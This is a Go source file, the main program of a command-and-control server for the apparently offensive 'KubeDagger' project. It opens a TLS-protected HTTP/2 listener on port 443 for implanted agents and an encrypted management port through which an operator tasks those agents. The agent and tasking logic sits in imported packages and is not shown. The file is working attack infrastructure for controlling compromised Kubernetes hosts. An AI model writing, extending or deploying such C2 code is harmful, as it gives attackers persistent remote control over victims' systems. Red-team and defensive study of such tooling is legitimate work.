package main

import (
	"context"
	"flag"
	"os"
	"os/signal"
	"syscall"

	"github.com/sirupsen/logrus"
	"github.com/yasindce1998/KubeDagger/pkg/c2server"
	"github.com/yasindce1998/KubeDagger/pkg/kubedagger/c2"
)

func main() {
	var (
		listenAddr = flag.String("listen", "0.0.0.0:443", "HTTP/2 listener address for agents")
		mgmtAddr   = flag.String("mgmt", "127.0.0.1:9443", "management port for operator CLI")
		keyHex     = flag.String("key", "", "shared encryption key (hex) for management port")
		tlsCA      = flag.String("ca", "", "path to CA cert PEM (auto-generate if empty)")
		tlsCert    = flag.String("cert", "", "path to server cert PEM")
		tlsKey     = flag.String("key-file", "", "path to server key PEM")
		plaintext  = flag.Bool("plaintext", false, "disable TLS (development only)")
		logLevel   = flag.String("log-level", "info", "log level (debug, info, warn, error)")
	)
	flag.Parse()

	level, err := logrus.ParseLevel(*logLevel)
	if err != nil {
		logrus.Fatalf("invalid log level: %v", err)
	}
	logrus.SetLevel(level)

	var cfg c2server.ServerConfig
	cfg.ListenAddr = *listenAddr

	if !*plaintext {
		tlsCfg, caPEM, err := setupTLS(*tlsCA, *tlsCert, *tlsKey, *listenAddr)
		if err != nil {
			logrus.Fatalf("TLS setup failed: %v", err)
		}
		cfg.TLSConfig = tlsCfg
		_ = caPEM
	}

	srv := c2server.NewServer(cfg)
	if err := srv.Start(); err != nil {
		logrus.Fatalf("server start failed: %v", err)
	}

	if *keyHex != "" {
		key, err := c2.DeriveKey(*keyHex)
		if err != nil {
			logrus.Fatalf("invalid management key: %v", err)
		}
		mgmt, err := c2server.NewMgmtServer(key, srv.Agents(), srv.Tasks())
		if err != nil {
			logrus.Fatalf("mgmt server failed: %v", err)
		}
		if err := mgmt.Start(*mgmtAddr); err != nil {
			logrus.Fatalf("mgmt listen failed: %v", err)
		}
		logrus.Infof("management port on %s", *mgmtAddr)
	}

	sig := make(chan os.Signal, 1)
	signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)
	<-sig

	logrus.Info("shutting down...")
	ctx, cancel := context.WithTimeout(context.Background(), 5000000000)
	defer cancel()
	srv.Stop(ctx)
}
